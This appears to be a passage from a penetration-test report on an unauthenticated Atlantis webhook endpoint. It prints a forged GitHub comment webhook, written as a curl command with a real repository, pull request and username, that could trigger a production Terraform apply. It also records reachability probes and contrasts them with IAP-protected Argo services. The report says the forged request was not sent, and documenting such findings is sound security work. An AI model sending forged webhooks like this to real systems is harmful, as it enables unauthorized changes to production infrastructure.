POC 6: Webhook trigger vector (unauthenticated, NOT executed — structural PoC only)
-------------------------------------------------------------------------------------
Demonstrates: the /events endpoint receives GitHub webhook payloads. If the
webhook secret is absent or weak, a forged PR comment event triggers Atlantis
to run plan/apply against any locked workspace.

Structure of a forged atlantis apply webhook:

  curl -sk -X POST https://atlantis.test.data.insider.engineering/events \
    -H "Content-Type: application/json" \
    -H "X-GitHub-Event: issue_comment" \
    -H "X-Hub-Signature-256: sha256=<computed_if_secret_known>" \
    -d '{
      "action": "created",
      "issue": {"number": 1613, "pull_request": {"url": "..."}},
      "comment": {"body": "atlantis apply -p snowflake-prod"},
      "repository": {"full_name": "businessinsider/data_eng_infra"},
      "sender": {"login": "CMurphyInsiderInc"}
    }'

This PoC was NOT sent. Authentication state of the /events endpoint was not
confirmed. The webhook secret is required to forge a valid X-Hub-Signature-256
header — if absent from Atlantis config, the check is skipped entirely and the
above request would trigger a live Terraform apply.

  Validation: curl -sk -o /dev/null -w "%{http_code}" \
    -X POST https://atlantis.test.data.insider.engineering/events \
    -H "Content-Type: application/json" -d '{}'
  Response observed: 400 (bad request — parsed but rejected for malformed payload)
  Significance: endpoint reachable and processing requests without IP restriction.


CONTRAST: GCP IAP-protected services (Argo Workflows)
-------------------------------------------------------
All prod cluster services except Atlantis are protected by GCP Identity-Aware
Proxy. For comparison:

  curl -ski https://argo-workflows.prod.data.insider.engineering/ | head -5

Expected output:
  HTTP/2 403
  content-type: text/html; charset=UTF-8
  via: 1.1 google

  curl -ski https://argo-workflows.prod.data.insider.engineering/api/v1/version | head -3

Expected output:
  HTTP/2 403

GCP IAP intercepts at the load balancer before any request reaches the Argo
application — including endpoints Argo treats as unconditionally unauthenticated.
Atlantis received no equivalent protection.
